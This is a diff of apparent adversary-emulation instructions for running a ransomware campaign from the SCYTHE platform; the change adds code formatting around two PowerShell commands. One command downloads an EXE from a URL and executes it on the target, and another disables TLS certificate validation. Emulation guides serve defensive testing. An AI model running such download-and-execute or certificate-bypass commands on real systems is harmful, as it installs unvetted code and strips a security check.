@@ -10,7 +10,7 @@ To emulate:
 5. Import from Existing Threat: Ransomware_Top_10
 6. Launch Campaign
 7. Click More Actions and copy the URL for the EXE. 
-8. In the target system, run this PowerShell command with the respective URL to download and execute the payload: $myscriptblock={$url="URL of EXE";$wc=New-Object System.Net.WebClient;$output="C:\Users\Public\scythe_payload.exe";$wc.DownloadFile($url,$output);C:\Users\Public\scythe_payload.exe};Invoke-Command -ScriptBlock $myscriptblock;
+8. In the target system, run this PowerShell command with the respective URL to download and execute the payload: ```$myscriptblock={$url="URL of EXE";$wc=New-Object System.Net.WebClient;$output="C:\Users\Public\scythe_payload.exe";$wc.DownloadFile($url,$output);C:\Users\Public\scythe_payload.exe};Invoke-Command -ScriptBlock $myscriptblock;```
 
 If you get a TLS certificate validation error, you can bypass with this PowerShell command:
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+```[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}```
